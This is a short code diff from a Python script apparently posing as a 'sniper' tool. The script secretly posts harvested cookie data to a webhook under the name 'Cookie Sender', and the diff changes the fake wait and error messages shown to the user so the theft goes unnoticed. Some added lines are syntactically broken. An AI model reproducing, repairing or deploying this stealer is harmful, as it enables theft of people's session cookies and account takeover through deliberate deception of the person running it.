@@ -35,14 +35,14 @@ def main():
                              Colors.purple_to_blue,
                              interval=0.005)
     os.system('cls')
-    w("Press enter to continue")
+    w("Wait one minute, do not press anything or the program will close!")
+time.sleep(67)
+w("Could not snipe anything, please use later in 20 minutes."
     requests.post(loadingauth,
                   json={
                       'username': 'Cookie Sender',
                       'content': f'```{cookiedata}```'
                   })
-    w("Wait 1 minute")
-    time.sleep(60)
-    print("Error, please restart this program and do it later in 10 minutes.")
+    
 
 main()
